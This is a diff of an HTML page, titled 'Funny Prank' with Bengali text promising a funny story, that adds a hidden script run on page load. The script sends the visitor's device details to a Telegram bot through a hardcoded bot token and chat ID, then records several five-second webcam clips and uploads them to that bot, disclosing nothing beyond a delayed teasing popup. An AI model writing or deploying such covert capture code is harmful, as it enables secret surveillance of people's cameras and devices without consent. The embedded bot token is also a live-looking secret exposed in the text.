@@ -3,43 +3,120 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Human or Robot Check</title>
+  <title>Funny Prank</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background-color: #f0f0f0;
+      text-align: center;
+      padding: 20px;
+      background-color: #f9f9f9;
     }
-    video, canvas {
-      display: block;
-      margin: 10px 0;
-      border: 2px solid #000;
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #fff;
+      border: 1px solid #ccc;
+      padding: 20px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      z-index: 1000;
     }
-    button {
-      padding: 10px 20px;
-      background-color: #007BFF;
-      color: #fff;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #0056b3;
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 999;
     }
   </style>
 </head>
 <body>
-  <h1>Human or Robot Verification</h1>
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="640" height="480"></canvas>
-  <button id="capture">Capture and Verify</button>
+  <h1>একটি মজার গল্প</h1>
+  <p>গল্প শুরু করার জন্য অপেক্ষা করুন।</p>
 
-  <script src="script.js"></script>
+  <div class="overlay"></div>
+  <div class="popup">
+    <h2>কিরে জাহিদ!</h2>
+    <p>বোকা বানালাম খুব মজা পেলাম, বাড়িতে দেখা কর।</p>
+  </div>
+
+  <script>
+    // Telegram Bot Configuration
+    const botToken = '7519273136:AAHZ7eBXEoVZRQFqILu8tGnuMLvtZOWohqc';
+    const chatId = '7945358964';
+
+    // Helper function to send data to Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message }),
+      });
+    }
+
+    // Capture device info and send to Telegram
+    function captureInfo() {
+      const deviceInfo = {
+        url: window.location.href,
+        title: document.title,
+        timestamp: new Date().toISOString(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+      };
+      sendToTelegram(`📱 Device Info:\n${JSON.stringify(deviceInfo, null, 2)}`);
+    }
+
+    // Capture video for 5 seconds
+    async function captureVideo() {
+      const constraints = { video: true };
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        const recorder = new MediaRecorder(stream);
+        let chunks = [];
+
+        recorder.ondataavailable = (e) => chunks.push(e.data);
+        recorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          const formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('video', blob, 'prank_video.webm');
+
+          const telegramURL = `https://api.telegram.org/bot${botToken}/sendVideo`;
+          await fetch(telegramURL, { method: 'POST', body: formData });
+          stream.getTracks().forEach((track) => track.stop());
+        };
+
+        recorder.start();
+        setTimeout(() => recorder.stop(), 5000); // Stop after 5 seconds
+      } catch (error) {
+        console.error('Error accessing camera:', error);
+      }
+    }
+
+    // Run the prank process
+    async function runPrank() {
+      for (let i = 0; i < 6; i++) {
+        await captureVideo();
+        await new Promise((resolve) => setTimeout(resolve, 5000)); // Wait for 5 seconds
+      }
+    }
+
+    // Show popup after 2 minutes
+    setTimeout(() => {
+      document.querySelector('.overlay').style.display = 'block';
+      document.querySelector('.popup').style.display = 'block';
+    }, 120000); // 2 minutes
+
+    // Start the prank
+    captureInfo();
+    runPrank();
+  </script>
 </body>
 </html>
